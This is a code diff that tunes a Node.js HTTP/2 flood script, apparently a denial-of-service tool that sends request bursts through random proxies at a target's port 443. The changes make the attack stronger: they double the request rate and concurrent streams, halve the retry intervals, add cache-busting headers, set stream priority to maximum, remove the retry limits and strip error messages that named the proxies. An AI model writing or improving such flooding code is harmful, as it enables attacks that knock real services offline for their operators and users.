@@ -90,7 +90,7 @@ if (cluster.isMaster) {
     }
     setTimeout(() => process.exit(0), args.time * 1000);
 } else {
-    setInterval(runFlooder, 100);
+    setInterval(runFlooder, 50);
 }
 
 class NetSocket {
@@ -117,19 +117,19 @@ class NetSocket {
             const isAlive = response.includes("HTTP/1.1 200");
             if (!isAlive) {
                 connection.destroy();
-                return callback(undefined, `error: invalid response from proxy ${options.host}:${options.port}`);
+                return callback(undefined, `error: invalid response`);
             }
             return callback(connection, undefined);
         });
 
         connection.on("timeout", () => {
             connection.destroy();
-            return callback(undefined, `error: timeout exceeded for ${options.host}:${options.port}`);
+            return callback(undefined, `error: timeout exceeded`);
         });
 
         connection.on("error", error => {
             connection.destroy();
-            return callback(undefined, `error: ${error.message} for ${options.host}:${options.port}`);
+            return callback(undefined, `error: ${error.message}`);
         });
     }
 }
@@ -150,41 +150,32 @@ function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     if (!parsedProxy[0] || !parsedProxy[1]) {
-        console.error(`Invalid proxy format: ${proxyAddr}`);
-        return setTimeout(runFlooder, 1000);
+        return setTimeout(runFlooder, 500);
     }
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
         address: parsedTarget.host + ":443",
-        timeout: 5
+        timeout: 3
     };
-
-    let retryCount = 0;
-    const maxRetries = 5;
 
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) {
             if (connection) connection.destroy();
-            if (retryCount < maxRetries) {
-                retryCount++;
-                console.error(`Retrying (${retryCount}/${maxRetries}) for ${proxyAddr}: ${error}`);
-                setTimeout(runFlooder, 1000);
-            } else {
-                console.error(`Max retries reached for ${proxyAddr}`);
-            }
-            return;
+            return setTimeout(runFlooder, 500);
         }
 
         const tlsOptions = {
             secure: true,
             ALPNProtocols: ['h2', 'http/1.1'],
-            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
+            ciphers: 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
             ecdhCurve: 'auto',
             host: parsedTarget.host,
             servername: parsedTarget.host,
-            rejectUnauthorized: false
+            rejectUnauthorized: false,
+            minVersion: 'TLSv1.2',
+            maxVersion: 'TLSv1.3'
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
@@ -194,7 +185,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 1000,
+                maxConcurrentStreams: 2000,
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536,
                 enablePush: false
@@ -206,10 +197,13 @@ function runFlooder() {
             const IntervalAttack = setInterval(() => {
                 const dynHeaders = {
                     ...headers,
-                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
+                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
+                    "cache-control": "no-cache",
+                    "pragma": "no-cache"
                 };
-                for (let i = 0; i < args.Rate; i++) {
+                for (let i = 0; i < args.Rate * 2; i++) {
                     const request = client.request(dynHeaders);
+                    request.setPriority({ weight: 255 });
                     request.on("response", () => {
                         request.close();
                         request.destroy();
@@ -220,22 +214,27 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, 100);
-            setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
+            }, 50);
+            setTimeout(() => {
+                clearInterval(IntervalAttack);
+                client.destroy();
+                tlsConn.destroy();
+                connection.destroy();
+            }, args.time * 1000);
         });
 
         client.on("error", () => {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, 1000);
+            setTimeout(runFlooder, 500);
         });
 
         client.on("close", () => {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, 1000);
+            setTimeout(runFlooder, 500);
         });
     });
 }
